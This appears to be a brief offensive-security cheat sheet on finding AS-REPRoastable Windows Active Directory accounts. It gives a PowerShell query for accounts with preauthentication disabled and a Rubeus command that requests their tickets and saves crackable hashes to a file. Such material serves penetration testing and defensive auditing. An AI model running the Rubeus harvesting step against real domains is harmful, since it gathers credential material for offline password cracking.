Identifying AS-REPRoastable Accounts (Windows)

Discovering users with disabled preauthentication using PowerShell and Rubeus.

PowerShell Command
Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' -Properties DoesNotRequirePreAuth | Select-Object Name,sAMAccountName,DoesNotRequirePreAuth
  • •Filters for user accounts where DoesNotRequirePreAuth is set to TRUE.
  • •Displays relevant user details and the attribute status.
  • •Requires the ActiveDirectory module.
Using Rubeus
Rubeus.exe asreproast /outfile:asreproast_hashes.txt
  • •Queries for vulnerable users and automatically requests TGTs.
  • •Saves collected TGTs in a crackable format to the specified output file.
  • •Streamlines the entire AS-REPRoasting process.
Key Takeaway

Both PowerShell and Rubeus are effective for identifying AS-REPRoastable accounts, with Rubeus offering a more integrated attack workflow.
